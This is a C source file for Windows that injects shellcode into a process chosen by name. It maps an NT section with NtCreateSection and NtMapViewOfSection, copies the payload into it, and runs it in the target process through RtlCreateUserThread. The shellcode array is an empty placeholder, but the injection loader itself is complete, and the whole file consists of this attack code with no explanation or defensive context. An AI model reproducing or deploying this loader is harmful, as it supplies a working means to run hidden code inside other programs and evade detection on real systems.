#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#pragma comment (lib, "advapi32")

// Shellcode placeholder for demonstration
unsigned char shellcodeBytes[] = { /* insert shellcode here */ };
unsigned int shellcodeLength = sizeof(shellcodeBytes);

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor; 
    PVOID SecurityQualityOfService; 
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
    HANDLE UniqueProcess;
    HANDLE UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef NTSTATUS (NTAPI * CreateSectionFunction)(
    OUT PHANDLE SectionHandle,
    IN ULONG DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG PageAttributes,
    IN ULONG SectionAttributes,
    IN HANDLE FileHandle OPTIONAL);

typedef NTSTATUS (NTAPI * MapViewOfSectionFunction)(
    HANDLE SectionHandle,
    HANDLE ProcessHandle,
    PVOID * BaseAddress,
    ULONG_PTR ZeroBits,
    SIZE_T CommitSize,
    PLARGE_INTEGER SectionOffset,
    PSIZE_T ViewSize,
    DWORD InheritDisposition,
    ULONG AllocationType,
    ULONG Win32Protect);

typedef FARPROC (WINAPI * CreateThreadFunction)(
    IN HANDLE ProcessHandle,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor OPTIONAL,
    IN BOOLEAN CreateSuspended,
    IN ULONG StackZeroBits,
    IN OUT PULONG StackReserved,
    IN OUT PULONG StackCommit,
    IN PVOID StartAddress,
    IN PVOID StartParameter OPTIONAL,
    OUT PHANDLE ThreadHandle,
    OUT PCLIENT_ID ClientId);

int GetProcessId(const char *processName) {
    int processId = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snapshot == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(snapshot, &entry)) {
        CloseHandle(snapshot);
        return 0;
    }

    while (Process32Next(snapshot, &entry)) {
        if (lstrcmpiA(processName, entry.szExeFile) == 0) {
            processId = entry.th32ProcessID;
            break;
        }
    }

    CloseHandle(snapshot);
    return processId;
}

int ExecuteShellcode(HANDLE processHandle, unsigned char * shellcode, unsigned int shellcodeSize) {
    HANDLE sectionHandle = NULL, threadHandle = NULL;
    PVOID localView = NULL, remoteView = NULL;
    CLIENT_ID clientId;

    // Create section
    CreateSectionFunction createSection = (CreateSectionFunction) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtCreateSection");
    if (!createSection) return GetLastError();
    createSection(&sectionHandle, SECTION_ALL_ACCESS, NULL, (PLARGE_INTEGER) &shellcodeSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);

    // Map local section view
    MapViewOfSectionFunction mapViewOfSection = (MapViewOfSectionFunction) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "NtMapViewOfSection");
    if (!mapViewOfSection) return GetLastError();
    mapViewOfSection(sectionHandle, GetCurrentProcess(), &localView, NULL, NULL, NULL, (SIZE_T *) &shellcodeSize, ViewUnmap, NULL, PAGE_READWRITE);

    // Inject payload into section
    memcpy(localView, shellcode, shellcodeSize);
    
    // Create remote view of section in the target process
    mapViewOfSection(sectionHandle, processHandle, &remoteView, NULL, NULL, NULL, (SIZE_T *) &shellcodeSize, ViewUnmap, NULL, PAGE_EXECUTE_READ);

    // Execute the payload
    CreateThreadFunction createThread = (CreateThreadFunction) GetProcAddress(GetModuleHandle("NTDLL.DLL"), "RtlCreateUserThread");
    if (!createThread) return GetLastError();

    createThread(processHandle, NULL, FALSE, 0, 0, 0, remoteView, NULL, &threadHandle, &clientId);
    if (!threadHandle) return GetLastError();

    WaitForSingleObject(threadHandle, 500);
    CloseHandle(threadHandle);
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc != 2) return GetLastError();

    int targetProcessId = GetProcessId(argv[1]);
    if (targetProcessId == 0) return GetLastError();

    HANDLE targetProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, (DWORD) targetProcessId);
    if (!targetProcess) return GetLastError();

    ExecuteShellcode(targetProcess, shellcodeBytes, shellcodeLength);
    CloseHandle(targetProcess);
    return 0;
}
